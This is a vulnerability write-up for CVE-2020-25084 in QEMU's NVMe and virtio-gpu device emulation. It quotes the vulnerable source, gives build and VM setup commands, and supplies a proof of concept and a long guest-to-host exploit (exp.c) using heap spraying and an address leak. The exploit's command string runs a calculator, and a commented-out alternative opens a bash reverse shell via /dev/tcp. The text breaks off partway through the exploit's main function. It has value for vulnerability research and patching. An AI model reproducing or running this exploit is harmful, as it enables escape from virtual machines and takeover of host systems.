# CVE-2020-25084

```cpp
517 static void nvme_init_sq(NvmeSQueue *sq, NvmeCtrl *n, uint64_t dma_addr,
518     uint16_t sqid, uint16_t cqid, uint16_t size)
519 {
...
529     sq->io_req = g_new(NvmeRequest, sq->size);
...
543 }
```

`nvme_process_sq` -> `nvme_io_cmd` -> `nvme_rw` -> `nvme_map_prp`

```cpp
900 static void nvme_process_sq(void *opaque)
901 {
...
911     while (!(nvme_sq_empty(sq) || QTAILQ_EMPTY(&sq->req_list))) {
...
922         status = sq->sqid ? nvme_io_cmd(n, &cmd, req) :
923             nvme_admin_cmd(n, &cmd, req);
...
928     }
929 }
```

```cpp
443 static uint16_t nvme_io_cmd(NvmeCtrl *n, NvmeCmd *cmd, NvmeRequest *req)
444 {
...
454     switch (cmd->opcode) {
455     ...
460     case NVME_CMD_READ:
461         return nvme_rw(n, ns, cmd, req);
462     ...
465     }
466 }
```

```cpp
394 static uint16_t nvme_rw(NvmeCtrl *n, NvmeNamespace *ns, NvmeCmd *cmd,
395     NvmeRequest *req)
396 {
...
418     if (nvme_map_prp(&req->qsg, &req->iov, prp1, prp2, data_size, n)) {
419         block_acct_invalid(blk_get_stats(n->conf.blk), acct);
420         return NVME_INVALID_FIELD | NVME_DNR;
421     }
...
440     return NVME_NO_COMPLETE;
441 }
```

```cpp
166 static uint16_t nvme_map_prp(QEMUSGList *qsg, QEMUIOVector *iov, uint64_t prp1,
167                              uint64_t prp2, uint32_t len, NvmeCtrl *n)
168 {
...
173     if (unlikely(!prp1)) {
            ...
176     } else if (n->bar.cmbsz && prp1 >= n->ctrl_mem.addr &&
177                prp1 < n->ctrl_mem.addr + int128_get64(n->ctrl_mem.size)) {
178         qsg->nsg = 0;
179         qemu_iovec_init(iov, num_prps);
180         qemu_iovec_add(iov, (void *)&n->cmbuf[prp1 - n->ctrl_mem.addr], trans_len);
181     } else {
182         pci_dma_sglist_init(qsg, &n->parent_obj, num_prps);
183         qemu_sglist_add(qsg, prp1, trans_len);
184     }
185     len -= trans_len;
186     if (len) {
187         if (unlikely(!prp2)) {
188             trace_pci_nvme_err_invalid_prp2_missing();
189             goto unmap;
190         }
            ...
241     }
242     return NVME_SUCCESS;
243
244  unmap:
245     qemu_sglist_destroy(qsg);
246     return NVME_INVALID_FIELD | NVME_DNR;
247 }
```

```cpp
613 int virtio_gpu_create_mapping_iov(VirtIOGPU *g,
614                                   struct virtio_gpu_resource_attach_backing *ab,
615                                   struct virtio_gpu_ctrl_command *cmd,
616                                   uint64_t **addr, struct iovec **iov)
617 {
...
641     *iov = g_malloc0(sizeof(struct iovec) * ab->nr_entries);
642     if (addr) {
643         *addr = g_malloc0(sizeof(uint64_t) * ab->nr_entries);
644     }
645     for (i = 0; i < ab->nr_entries; i++) {
646         uint64_t a = le64_to_cpu(ents[i].addr);
647         uint32_t l = le32_to_cpu(ents[i].length);
648         hwaddr len = l;
649         (*iov)[i].iov_len = l;
650         (*iov)[i].iov_base = dma_memory_map(VIRTIO_DEVICE(g)->dma_as,
651                                             a, &len, DMA_DIRECTION_TO_DEVICE);
...
668     }
...
670     return 0;
671 }
```

```cpp
1340 static int ehci_execute(EHCIPacket *p, const char *action)
1341 {
...
1368     if (p->async == EHCI_ASYNC_NONE) {
1369         if (ehci_init_transfer(p) != 0) {
1370             return -1;
1371         }
1372
1373         spd = (p->pid == USB_TOKEN_IN && NLPTR_TBIT(p->qtd.altnext) == 0);
1374         usb_packet_setup(&p->packet, p->pid, ep, 0, p->qtdaddr, spd,
1375                          (p->qtd.token & QTD_TOKEN_IOC) != 0);
1376         usb_packet_map(&p->packet, &p->sgl);
1377         p->async = EHCI_ASYNC_INITIALIZED;
1378     }
1379
1380     trace_usb_ehci_packet_action(p->queue, p, action);
1381     usb_handle_packet(p->queue->dev, &p->packet);
...
1392     return 1;
1393 }
```

```cpp
26 int usb_packet_map(USBPacket *p, QEMUSGList *sgl)
27 {
...
33     for (i = 0; i < sgl->nsg; i++) {
34         dma_addr_t base = sgl->sg[i].base;
35         dma_addr_t len = sgl->sg[i].len;
36
37         while (len) {
38             dma_addr_t xlen = len;
39             mem = dma_memory_map(sgl->as, base, &xlen, dir);
40             if (!mem) {
41                 goto err;
42             }
...
49         }
50     }
51     return 0;
52
53 err:
54     usb_packet_unmap(p, sgl);
55     return -1;
56 }
```

`dma-helpers.c`

```cpp
66 void qemu_sglist_destroy(QEMUSGList *qsg)
67 {
68     object_unref(OBJECT(qsg->dev));
69     g_free(qsg->sg);
70     memset(qsg, 0, sizeof(*qsg));
71 }
```

`include/sysemu/dma.h`

```cpp
25 struct QEMUSGList {
26     ScatterGatherEntry *sg;
27     int nsg;
28     int nalloc;
29     size_t size;
30     DeviceState *dev;
31     AddressSpace *as;
32 };
```

```cpp
1047 static void nvme_write_bar(NvmeCtrl *n, hwaddr offset, uint64_t data,
1048     unsigned size)
1049 {
...
1065     switch (offset) {
...
1147     case 0x28:  /* ASQ */
1148         n->bar.asq = data;
1149         trace_pci_nvme_mmio_asqaddr(data);
1150         break;
1151     case 0x2c:  /* ASQ hi */
1152         n->bar.asq |= data << 32;
1153         trace_pci_nvme_mmio_asqaddr_hi(data, n->bar.asq);
1154         break;
1155     case 0x30:  /* ACQ */
1156         trace_pci_nvme_mmio_acqaddr(data);
1157         n->bar.acq = data;
1158         break;
1159     case 0x34:  /* ACQ hi */
1160         n->bar.acq |= data << 32;
1161         trace_pci_nvme_mmio_acqaddr_hi(data, n->bar.acq);
1162         break;
...
1198     }
1199 }
```

```cpp
273 static uint16_t nvme_dma_read_prp(NvmeCtrl *n, uint8_t *ptr, uint32_t len,
274     uint64_t prp1, uint64_t prp2)
275 {
276     QEMUSGList qsg; // Stack Variable
277     QEMUIOVector iov;
278     uint16_t status = NVME_SUCCESS;
...
282     if (nvme_map_prp(&qsg, &iov, prp1, prp2, len, n)) {
283         return NVME_INVALID_FIELD | NVME_DNR;
284     }
...
298     return status;
299 }
```

```cpp
249 static uint16_t nvme_dma_write_prp(NvmeCtrl *n, uint8_t *ptr, uint32_t len,
250                                    uint64_t prp1, uint64_t prp2)
251 {
252     QEMUSGList qsg; // Stack Variable
253     QEMUIOVector iov;
254     uint16_t status = NVME_SUCCESS;
255
256     if (nvme_map_prp(&qsg, &iov, prp1, prp2, len, n)) {
257         return NVME_INVALID_FIELD | NVME_DNR;
258     }
...
270     return status;
271 }
```

```cpp
394 static uint16_t nvme_rw(NvmeCtrl *n, NvmeNamespace *ns, NvmeCmd *cmd,
395     NvmeRequest *req)
396 {
...
418     if (nvme_map_prp(&req->qsg, &req->iov, prp1, prp2, data_size, n)) { // Pointer to Heap
419         block_acct_invalid(blk_get_stats(n->conf.blk), acct);
420         return NVME_INVALID_FIELD | NVME_DNR;
421     }
...
440     return NVME_NO_COMPLETE;
441 }
```

```cpp
19 typedef struct NvmeRequest {
20     struct NvmeSQueue       *sq;
21     BlockAIOCB              *aiocb;
22     uint16_t                status;
23     bool                    has_sg;
24     NvmeCqe                 cqe;
25     BlockAcctCookie         acct;
26     QEMUSGList              qsg; // 0x40
27     QEMUIOVector            iov;
28     QTAILQ_ENTRY(NvmeRequest)entry;
29 } NvmeRequest;
```

```cpp
900 static void nvme_process_sq(void *opaque)
901 {
902     NvmeSQueue *sq = opaque;
903     NvmeCtrl *n = sq->ctrl;
904     NvmeCQueue *cq = n->cq[sq->cqid];
905
906     uint16_t status;
907     hwaddr addr;
908     NvmeCmd cmd;
909     NvmeRequest *req;
910
911     while (!(nvme_sq_empty(sq) || QTAILQ_EMPTY(&sq->req_list))) {
912         addr = sq->dma_addr + sq->head * n->sqe_size;
913         nvme_addr_read(n, addr, (void *)&cmd, sizeof(cmd));
914         nvme_inc_sq_head(sq);
915
916         req = QTAILQ_FIRST(&sq->req_list);
917         QTAILQ_REMOVE(&sq->req_list, req, entry);
918         QTAILQ_INSERT_TAIL(&sq->out_req_list, req, entry);
919         memset(&req->cqe, 0, sizeof(req->cqe));
920         req->cqe.cid = cmd.cid;
921
922         status = sq->sqid ? nvme_io_cmd(n, &cmd, req) :
923             nvme_admin_cmd(n, &cmd, req); // set sq->sqid = 1
924         if (status != NVME_NO_COMPLETE) {
925             req->status = status;
926             nvme_enqueue_req_completion(cq, req);
927         }
928     }
929 }
```

```cpp
443 static uint16_t nvme_io_cmd(NvmeCtrl *n, NvmeCmd *cmd, NvmeRequest *req)
444 {
445     NvmeNamespace *ns;
446     uint32_t nsid = le32_to_cpu(cmd->nsid);
447
448     if (unlikely(nsid == 0 || nsid > n->num_namespaces)) {
449         trace_pci_nvme_err_invalid_ns(nsid, n->num_namespaces);
450         return NVME_INVALID_NSID | NVME_DNR;
451     }
452
453     ns = &n->namespaces[nsid - 1];
454     switch (cmd->opcode) {
455     case NVME_CMD_FLUSH:
456         return nvme_flush(n, ns, cmd, req);
457     case NVME_CMD_WRITE_ZEROS:
458         return nvme_write_zeros(n, ns, cmd, req);
459     case NVME_CMD_WRITE:
460     case NVME_CMD_READ:
461         return nvme_rw(n, ns, cmd, req); // set cmd->opcode = NVME_CMD_READ
462     default:
463         trace_pci_nvme_err_invalid_opc(cmd->opcode);
464         return NVME_INVALID_OPCODE | NVME_DNR;
465     }
466 }
```

`hw/block/nvme.c`

```cpp
1319 static void nvme_mmio_write(void *opaque, hwaddr addr, uint64_t data,
1320     unsigned size)
1321 {
1322     NvmeCtrl *n = (NvmeCtrl *)opaque;
1323     if (addr < sizeof(n->bar)) {
1324         nvme_write_bar(n, addr, data, size);
1325     } else if (addr >= 0x1000) {
1326         nvme_process_db(n, addr, data);
1327     }
1328 }
```

`hw/block/nvme.h`

```cpp

```

`include/block/nvme.h`

```cpp
typedef struct NvmeBar {
    uint64_t    cap;
    uint32_t    vs;
    uint32_t    intms;
    uint32_t    intmc;
    uint32_t    cc; // Controller Configuration
    uint32_t    rsvd1;
    uint32_t    csts;
    uint32_t    nssrc;
    uint32_t    aqa;
    uint64_t    asq; // Address of SQ
    uint64_t    acq;
    uint32_t    cmbloc;
    uint32_t    cmbsz;
    uint8_t     padding[3520]; /* not used by QEMU */
    uint32_t    pmrcap;
    uint32_t    pmrctl;
    uint32_t    pmrsts;
    uint32_t    pmrebs;
    uint32_t    pmrswtp;
    uint32_t    pmrmsc;
} NvmeBar;
```

```cpp
517 static void nvme_init_sq(NvmeSQueue *sq, NvmeCtrl *n, uint64_t dma_addr,
518     uint16_t sqid, uint16_t cqid, uint16_t size)
519 {
...
529     sq->io_req = g_new(NvmeRequest, sq->size);
...
543 }
```

# Environment

```bash
$ git clone
$ mkdir build && cd build/
$ ../configure --target-list=x86_64-softmmu --enable-debug --extra-cflags="-pg"
```

```bash
$ ./qemu/build/qemu-img create -f qcow2 ubuntu.img 20G
$ ./qemu/build/x86_64-softmmu/qemu-system-x86_64 -m 2G -enable-kvm ubuntu.img -cdrom ./ubuntu-20.04.2-live-server-amd64.iso
```

```bash
$ ./qemu/build/qemu-img create nvme.img 10G
$ ./qemu/build/x86_64-softmmu/qemu-system-x86_64 -m 2G -enable-kvm -boot c -drive format=qcow2,file=./ubuntu.img \
        -nic user,hostfwd=tcp:0.0.0.0:2200-:22 \
        -drive format=raw,file=./nvme.img,if=none,id=D11 -device nvme,drive=D11,serial=1234,cmb_size_mb=64 \
        -device virtio-gpu
```

Controller Memory Buffer

# Proof of Concept

`common.c`

```cpp
#include <stdlib.h>
#include <stdio.h>
#include <sys/io.h>
#include <fcntl.h>
#include <inttypes.h>
#include <assert.h>
#include <sys/dir.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <string.h>
#include "common.h"

void* mem_map(const char* dev, size_t offset, size_t size) { // 映射设备内存
    int fd = open(dev, O_RDWR | O_SYNC);
    if (fd == -1) {
        return 0;
    }

    void* result = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, offset);

    if (!result) {
        return 0;
    }

    close(fd);
    return result;
}


uint32_t page_offset(uint32_t addr) { // 计算内存地址的页偏移
    return addr & ((1 << PAGE_SHIFT) - 1); // addr & (PAGE_SIZE - 1)
}

uint64_t gva_to_gfn(void *addr) { // 将Guest Virtual Address转化为Guest Frame Number
    int fd = open("/proc/self/pagemap", O_RDONLY);
	if (fd < 0) {
		perror("open");
		exit(1);
	}
	uint64_t pme, gfn;
	size_t offset;
	offset = ((uintptr_t)addr >> 9) & ~7; // 计算偏移
	lseek(fd, offset, SEEK_SET);
	read(fd, &pme, 8); // 获取pagemap entry
	if (!(pme & PFN_PRESENT))
		return -1;
	gfn = pme & PFN_PFN; // 获得对应的内存页帧号
	return gfn;
}

uint64_t gva_to_gpa(void *addr) { // 将Guest Virtual Address转化为Guest Physical Address
	uint64_t gfn = gva_to_gfn(addr);
	assert(gfn != -1);
	return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}
```

`poc.c`

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "common.h"

// cat /proc/iomem -> NVMe
uint32_t mmio_addr = 0xfebd0000;
uint32_t mmio_size = 0x4000;

char *mmio_base;

typedef struct NvmeCmd {
    uint8_t     opcode;
    uint8_t     fuse;
    uint16_t    cid;
    uint32_t    nsid;
    uint64_t    res1;
    uint64_t    mptr;
    uint64_t    prp1;
    uint64_t    prp2;
    uint32_t    cdw10;
    uint32_t    cdw11;
    uint32_t    cdw12;
    uint32_t    cdw13;
    uint32_t    cdw14;
    uint32_t    cdw15;
} NvmeCmd;

NvmeCmd *cmds;

void nvme_wr32(uint32_t addr, uint32_t value) { // 往NVME设备上写入值
    *((uint32_t*)(mmio_base + addr)) = value;
}

uint32_t nvme_rd32(uint32_t addr) { // 读取NVME设备上的值
    return *((uint32_t*)(mmio_base + addr));
}

void exploit() { // Proof of Concept
    /* mmio_write_bar */
    // 触发nvme_clear_ctrl
    nvme_wr32(0x14, 0);             // nvme_clear_ctrl
    // 设置SQ（提交队列）地址
    nvme_wr32(0x28, gva_to_gpa(cmds)); // ASQ low 4 byte
    nvme_wr32(0x2c, gva_to_gpa(cmds) >> 32); // ASQ high 4 byte
    // 触发nvme_start_ctrl
    uint32_t data = 1;
    data |= 6 << 16;                //  sqes
    data |= 4 << 20;                //  cqes
    nvme_wr32(0x14, data);          // nvme_start_ctrl -> 触发漏洞点
    // 设置cmd
    NvmeCmd *cmd = &cmds[0];
    cmd->opcode = 6;                // NVME_ADM_CMD_IDENTIFY
    cmd->cdw10 = 1;                 // NVME_ID_CNS_CTRL
    cmd->prp1 = 0xf8000000 + 0x500;
    cmd->prp2 = 0xf8000000 + 0x4000000;                  // 0
    /* nvme_process_db */
    nvme_wr32(0x1000, 1); // Submission queue doorbell write
}

int main(int argc, char *argv[]) {
    mmio_base = mem_map("/dev/mem", mmio_addr, mmio_size); // 获取MMIO的物理地址映射
    if (!mmio_base) {
        return 0;
    }

    cmds = (NvmeCmd *)aligned_alloc(0x1000, 20 * sizeof(NvmeCmd));
    memset(cmds, 0xb, sizeof(cmds));
    printf("mmio_base = 0x%lx\n", (long)mmio_base);
    printf("cmd phy addr = 0x%lx\n", (long)gva_to_gpa(cmds));
    exploit();
}
```

# Exploit

`exp.c`

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "common.h"

#define CMD_NUMS 30
#define CMD_SIZE 60

uint32_t nvme_mmio_addr = 0xfebf0000;
uint32_t nvme_mmio_size = 0x2000;

uint32_t gpu_mmio_addr = 0xfd000000;
uint32_t gpu_mmio_size = 0x4000;

char *nvme_mmio_base;
char *gpu_mmio_base;

const char exec_cmd[] = ";gnome-calculator";
// const char exec_cmd[] = ";/bin/bash -c  'bash -i >& /dev/tcp/127.0.0.1/3333 0>&1'";
// #define printf //

uint64_t system_offset = 0x2cf170;
uint64_t nvme_process_sq_offset = 0x5A7D00;
uint64_t cleanup_offset = 0x708390;

typedef struct NvmeCmd {
    uint8_t     opcode;
    uint8_t     fuse;
    uint16_t    cid;
    uint32_t    nsid;
    uint64_t    res1;
    uint64_t    mptr;
    uint64_t    prp1;
    uint64_t    prp2;
    uint32_t    cdw10;
    uint32_t    cdw11;
    uint32_t    cdw12;
    uint32_t    cdw13;
    uint32_t    cdw14;
    uint32_t    cdw15;
} NvmeCmd;

typedef struct NvmeCqe {
    uint32_t    result;
    uint32_t    rsvd;
    uint16_t    sq_head;
    uint16_t    sq_id;
    uint16_t    cid;
    uint16_t    status;
} NvmeCqe;

NvmeCmd *cmds[CMD_NUMS];
NvmeCqe cqe;
uint32_t admin_tail = 0;


#define VRING_DESC_F_NEXT	1
#define VRING_DESC_F_WRITE	2

#define VIRTIO_PCI_COMMON_STATUS	20
#define VIRTIO_PCI_COMMON_Q_SELECT 22
#define VIRTIO_PCI_COMMON_Q_SIZE	24
#define VIRTIO_PCI_COMMON_Q_ENABLE	28
#define VIRTIO_PCI_COMMON_Q_DESCLO	32
#define VIRTIO_PCI_COMMON_Q_DESCHI	36
#define VIRTIO_PCI_COMMON_Q_AVAILLO	40
#define VIRTIO_PCI_COMMON_Q_AVAILHI	44

#define VIRTIO_GPU_CMD_RESOURCE_CREATE_2D       0x101
#define VIRTIO_GPU_CMD_RESOURCE_DETACH_BACKING  0x106

typedef struct VRingDesc {
  uint64_t addr;
  uint32_t len;
  uint16_t flags;
  uint16_t next;
} VRingDesc;

typedef struct VRingAvail {
  uint16_t flags;
  uint16_t idx;
  uint16_t ring[];
} VRingAvail;

struct virtio_gpu_ctrl_hdr {
	uint32_t type;
	uint32_t flags;
	uint64_t fence_id;
	uint32_t ctx_id;
	uint32_t padding;
};

typedef struct Virtio_gpu_resource_attach_backing {
	struct virtio_gpu_ctrl_hdr hdr;
	uint32_t resource_id;
	uint32_t nr_entries;
} Virtio_gpu_resource_attach_backing;


typedef struct Virtio_gpu_resource_create_2d {
	struct virtio_gpu_ctrl_hdr hdr;
	uint32_t resource_id;
	uint32_t format;
	uint32_t width;
	uint32_t height;
} Virtio_gpu_resource_create_2d;

typedef struct Virtio_gpu_mem_entry {
	uint64_t addr;
	uint32_t length;
	uint32_t padding;
} Virtio_gpu_mem_entry;

VRingDesc *desc;
VRingAvail *avail;
Virtio_gpu_mem_entry *ent;
char *gpu_cmd;

void gpu_wr32(uint32_t addr, uint32_t value) {
    *((uint32_t*)(gpu_mmio_base + addr)) = value;
}

void init_gpu(void) {
    desc = (VRingDesc *)aligned_alloc(0x1000, 100 * sizeof(VRingDesc));
    avail = (VRingAvail *)aligned_alloc(0x1000, 100 * sizeof(VRingAvail));
    printf("[+] DESC VIR ADDR = 0x%lx, PHY ADDR = 0x%lx\n", (uint64_t)desc, gva_to_gpa(desc));
    printf("[+] Avail VIR ADDR = 0x%lx, PHY ADDR = 0x%lx\n", (uint64_t)avail, gva_to_gpa(avail));

    gpu_wr32(VIRTIO_PCI_COMMON_STATUS, 0);                          // reset virtio
    gpu_wr32(VIRTIO_PCI_COMMON_Q_SELECT, 0);                        // sel number
    gpu_wr32(VIRTIO_PCI_COMMON_Q_SIZE, 640);                        // vq->vring.num
    gpu_wr32(VIRTIO_PCI_COMMON_Q_DESCLO, gva_to_gpa(desc));         // desc phy addr
    gpu_wr32(VIRTIO_PCI_COMMON_Q_DESCHI, gva_to_gpa(desc) >> 32);
    gpu_wr32(VIRTIO_PCI_COMMON_Q_AVAILLO, gva_to_gpa(avail));       // avail phy addr
    gpu_wr32(VIRTIO_PCI_COMMON_Q_AVAILHI, gva_to_gpa(avail) >> 32);
    gpu_wr32(VIRTIO_PCI_COMMON_Q_ENABLE, 1);                        // enable
}

void heap_layout1(void) {
    Virtio_gpu_resource_create_2d *c2d = (Virtio_gpu_resource_create_2d*)malloc(sizeof(Virtio_gpu_resource_create_2d));
    c2d->hdr.type = VIRTIO_GPU_CMD_RESOURCE_CREATE_2D;
    c2d->resource_id = 2;
    c2d->format = 1;
    c2d->width = 0x100;
    c2d->height = 0x100;

    Virtio_gpu_resource_attach_backing *ab = (Virtio_gpu_resource_attach_backing*)malloc(sizeof(Virtio_gpu_resource_attach_backing));
    ab->hdr.type = VIRTIO_GPU_CMD_RESOURCE_DETACH_BACKING;
    ab->resource_id = 2;
    ab->nr_entries = 20;                                  // alloc 0x150 chunk

    ent = (Virtio_gpu_mem_entry*)malloc(0x280);           // 0x280,  0x30 for timer
    memset(ent, 'A', sizeof(Virtio_gpu_mem_entry) * 3);
    ent->addr = gva_to_gpa(ent);
    ent->length = sizeof(Virtio_gpu_mem_entry);

    Virtio_gpu_mem_entry *bounce_ent = (Virtio_gpu_mem_entry*)malloc(sizeof(Virtio_gpu_mem_entry));
    bounce_ent->addr = 0x77ffff0000;                     // Let dma_memory_map fail, in order to set qsg->dev as zero.
    bounce_ent->length = 0x280;                          // Then bypass the object_unref in qemu_sglist_destroy. And free the mapping table.

    Virtio_gpu_mem_entry *next_bounce_ent = (Virtio_gpu_mem_entry*)malloc(sizeof(Virtio_gpu_mem_entry));
    next_bounce_ent->addr = 0x77ffff0000;
    next_bounce_ent->length = 0;

    desc[0].addr = gva_to_gpa(c2d);
    desc[0].len = sizeof(Virtio_gpu_resource_create_2d);
    desc[0].flags = 0;
    desc[0].next = 1;

    desc[20].addr = gva_to_gpa(ab);
    desc[20].len = sizeof(Virtio_gpu_resource_attach_backing);
    desc[20].flags = VRING_DESC_F_NEXT;
    desc[20].next = 21;

    for(int i=21; i<59; i++) {                           // for padding
        desc[i].addr = gva_to_gpa(ent);
        desc[i].len = sizeof(Virtio_gpu_mem_entry);
        desc[i].flags = VRING_DESC_F_NEXT;
        desc[i].next = i+1;
    }

    // desc[25].addr = gva_to_gpa(bounce_ent);               // alloc bounce buffer
    desc[24].addr = gva_to_gpa(bounce_ent);
    desc[26].addr = gva_to_gpa(next_bounce_ent);

    desc[59].addr = gva_to_gpa(ent);                        // alloc bounce buffer
    desc[59].len = sizeof(Virtio_gpu_mem_entry);
    desc[59].flags = 0;
    desc[59].next = 2;

    avail[0].idx = 2;
    avail->ring[0] = 0;
    avail->ring[1] = 20;

    gpu_wr32(0x3000, 1);                                            // notify
}

void heap_layout2(void) {
    Virtio_gpu_resource_create_2d *c2d = (Virtio_gpu_resource_create_2d*)malloc(sizeof(Virtio_gpu_resource_create_2d));
    c2d->hdr.type = VIRTIO_GPU_CMD_RESOURCE_CREATE_2D;
    c2d->resource_id = 3;
    c2d->format = 1;
    c2d->width = 0x100;
    c2d->height = 0x100;

    gpu_cmd = malloc(0x200);
    memcpy(gpu_cmd+0x20, exec_cmd, strlen(exec_cmd));

    for(int i=0; i<21; i++) {                           // for padding
        desc[i].addr = gva_to_gpa(gpu_cmd);
        desc[i].len = sizeof(Virtio_gpu_mem_entry);
        desc[i].flags = VRING_DESC_F_NEXT;
        desc[i].next = i+1;
    }

    desc[21].addr = gva_to_gpa(gpu_cmd);
    desc[21].len = sizeof(Virtio_gpu_mem_entry);
    desc[21].flags = 0;
    desc[21].next = 2;

    avail[0].idx = 3;
    avail->ring[2] = 0;

    gpu_wr32(0x3000, 1);                                            // notify
}

void heap_layout3(void) {
    Virtio_gpu_resource_create_2d *c2d = (Virtio_gpu_resource_create_2d*)malloc(sizeof(Virtio_gpu_resource_create_2d));
    c2d->hdr.type = VIRTIO_GPU_CMD_RESOURCE_CREATE_2D;
    c2d->resource_id = 4;
    c2d->format = 1;
    c2d->width = 0x100;
    c2d->height = 0x100;

    Virtio_gpu_resource_attach_backing *ab = (Virtio_gpu_resource_attach_backing*)malloc(sizeof(Virtio_gpu_resource_attach_backing));
    ab->hdr.type = VIRTIO_GPU_CMD_RESOURCE_DETACH_BACKING;
    ab->resource_id = 4;
    ab->nr_entries = 20;

    ent = (Virtio_gpu_mem_entry*)malloc(0x30);           // 0x280,  0x30 for timer
    memset(ent, 'A', sizeof(Virtio_gpu_mem_entry) * 3);
    ent->addr = gva_to_gpa(ent);
    ent->length = sizeof(Virtio_gpu_mem_entry);

    Virtio_gpu_mem_entry *bounce_ent = (Virtio_gpu_mem_entry*)malloc(sizeof(Virtio_gpu_mem_entry));
    bounce_ent->addr = 0x77ffff0000;
    bounce_ent->length = 0x280;

    Virtio_gpu_mem_entry *next_bounce_ent = (Virtio_gpu_mem_entry*)malloc(sizeof(Virtio_gpu_mem_entry));
    next_bounce_ent->addr = 0x77ffff0000;
    next_bounce_ent->length = 0;

    desc[0].addr = gva_to_gpa(c2d);
    desc[0].len = sizeof(Virtio_gpu_resource_create_2d);
    desc[0].flags = 0;
    desc[0].next = 1;

    desc[20].addr = gva_to_gpa(ab);
    desc[20].len = sizeof(Virtio_gpu_resource_attach_backing);
    desc[20].flags = VRING_DESC_F_NEXT;
    desc[20].next = 21;

    for(int i=21; i<59; i++) {                           // for padding
        desc[i].addr = gva_to_gpa(ent);
        desc[i].len = sizeof(Virtio_gpu_mem_entry);
        desc[i].flags = VRING_DESC_F_NEXT;
        desc[i].next = i+1;
    }

    desc[24].addr = gva_to_gpa(bounce_ent);
    desc[26].addr = gva_to_gpa(next_bounce_ent);

    desc[59].addr = gva_to_gpa(ent);                        // alloc bounce buffer
    desc[59].len = sizeof(Virtio_gpu_mem_entry);
    desc[59].flags = 0;
    desc[59].next = 2;

    avail[0].idx = 5;
    avail->ring[3] = 0;
    avail->ring[4] = 20;

    gpu_wr32(0x3000, 1);                                            // notify
}

void nvme_wr32(uint32_t addr, uint32_t value) {
    *((uint32_t*)(nvme_mmio_base + addr)) = value;
    sleep(0.1);
}

uint32_t nvme_rd32(uint32_t addr) {
    return *((uint32_t*)(nvme_mmio_base + addr));
}

void init_nvme(void) {
    nvme_wr32(0x14, 0);				// nvme_clear_ctrl
    nvme_wr32(0x24, 0xff00ff);          // n->bar.aqa
	nvme_wr32(0x28, gva_to_gpa(cmds[0]));
	nvme_wr32(0x2c, gva_to_gpa(cmds[0]) >> 32);

	uint32_t data = 1;
	data |= 6 << 16;				//  sqes
	data |= 4 << 20;				//	cqes
	nvme_wr32(0x14, data);				// nvme_start_ctrl
}

uint32_t inc_tail(void) {
    int cur = admin_tail;
    admin_tail = (admin_tail + 1) % CMD_SIZE;
    return cur;
}

NvmeCmd create_cq(uint32_t prp1, uint32_t cqid, uint32_t qsize) {
    NvmeCmd cmd;
    cmd.opcode = 5;
    cmd.prp1 = prp1;
    cmd.cdw10 = cqid;
    cmd.cdw10 |= qsize << 16;
    cmd.cdw11 = 1;                       //  cq_flags
    cmd.cdw11 |= 0 << 16;                //  irq_vector
    return cmd;
}

void create_cqlist(void) {
    NvmeCmd *cmd = cmds[0];
    int i;
    for(i=0; i<25; i++) {
        cmd[inc_tail()] = create_cq(gva_to_gpa(&cqe), i + 1, 64);
    }
    nvme_wr32(0x1000, admin_tail);
}

NvmeCmd create_sq(uint64_t prp1, uint32_t sqid, uint32_t qsize, uint32_t cqid) {
    NvmeCmd cmd;
    cmd.opcode = 1;
    cmd.prp1 = prp1;
    cmd.cdw10 = sqid;
    cmd.cdw10 |= qsize << 16;
    cmd.cdw11 = 1;                       //  sq_flags
    cmd.cdw11 |= cqid << 16;
    return cmd;
}

NvmeCmd del_sq(uint32_t qid) {
    NvmeCmd cmd;
    cmd.opcode = 0;
    cmd.cdw10 = qid;
    return cmd;
}

void vuln(uint64_t sqid) {
    NvmeCmd *cmd = cmds[sqid];

    cmd[0].nsid = 1;
    cmd[0].opcode = 2;                // NVME_CMD_READ
    cmd[0].prp1 = 0xf8000000 + 0x500;
    cmd[0].prp2 = 0;
    cmd[0].cdw10 = 5;                 // slba
    cmd[0].cdw11 = 0;
    cmd[0].cdw12 = 8;                 // nlb

    nvme_wr32(0x1000 + sqid*8, 1);
}

int main(int argc, char *argv[]) {
    nvme_mmio_base = mem_map("/dev/mem", nvme_mmio_addr, nvme_mmio_size);
    if (!nvme_mmio_base) {
        return 0;
    }

    gpu_mmio_base = mem_map("/dev/mem", gpu_mmio_addr, gpu_mmio_size);
    if (!gpu_mmio_base) {
        return 0;
    }

    for(int i=0; i<CMD_NUMS; i++)
        cmds[i] = (NvmeCmd *)aligned_alloc(0x1000, CMD_SIZE * sizeof(NvmeCmd));

	printf("[*] NVME MMIO BASE ADDRESS = 0x%lx\n", (long)nvme_mmio_base);
	printf("[*] NVME CMD PHY ADDR = 0x%lx\n", (long)gva_to_gpa(cmds));
    init_nvme();
    printf("[D] NVME INIT OK!\n");

    printf("[*] VIRTIO GPU MMIO BASE ADDRESS = 0x%lx\n", gpu_mmio_base);
    init_gpu();
    printf("[D] GPU INIT OK!\n");

    /*              heap spray              */
	create_cqlist();
    NvmeCmd *cmd = cmds[0];
    for(int i=10; i<20; i++)
        cmd[inc_tail()] = create_sq(gva_to_gpa(cmds[i]), i, 3, i);
    nvme_wr32(0x1000, admin_tail);
    printf("[D] NVME HEAP SPRAY 0x290 CHUNK OK!\n");
    // getchar();

    /*         construct unintialized chunk */
    heap_layout1();
    printf("[D] VIRTIO GPU HEAP LAYOUT OK! 0x150 TABLE -> USERSPACE 0x290 CHUNK\n");
    // getchar();

    /*           free chunk 0x150->0x290 , use sqid = 1   */
    cmd[inc_tail()] = create_sq(gva_to_gpa(cmds[1]), 1, 1, 1);
	nvme_wr32(0x1000, admin_tail);
    vuln(1);
    printf("[D] NVME FREE 0x290 CHUNK OK!\n");
    // getchar();

    /*          malloc map table            */
    heap_layout2();
    printf("[D] VIRTIO GPU PLACE MAP TABLE TO LEAK PHYSMAP ADDR!\n");
    // getchar();
    sleep(1);

    uint64_t *leak = (uint64_t *)ent;
    uint64_t physmap_addr = leak[36];
    *(uint64_t *)(gpu_cmd) = physmap_addr + 0x20;
    printf("[D] physmap_addr addr = 0x%lx\n", physmap_addr);
    // getchar();

    /*           del chunk 0x150 to fill up 0x150 freelist
                 heap spray 0x290 chunk to clear 0x290 freelist         */
    cmd[inc_tail()] = del_sq(1);
